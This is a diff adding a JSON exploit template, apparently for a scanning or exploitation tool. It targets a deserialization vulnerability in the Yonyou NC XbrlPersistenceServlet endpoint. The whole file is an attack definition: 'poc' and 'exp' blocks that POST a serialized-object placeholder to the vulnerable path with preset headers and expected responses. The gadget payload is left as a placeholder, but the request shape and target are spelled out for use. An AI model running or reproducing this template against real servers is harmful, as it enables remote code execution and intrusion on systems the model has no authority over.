@@ -1,0 +1,27 @@
+{
+	"name":"用友 NC XbrlPersistenceServlet反序列化",
+	"tag":"yongyou",
+	"type":"deserialize",
+	"poc":{
+		"pocGet":"/service/~xbrl/XbrlPersistenceServlet",
+		"pocPost":"{{serialization}}",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/service/~xbrl/XbrlPersistenceServlet",
+			"expPost":"{{serialization}}",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
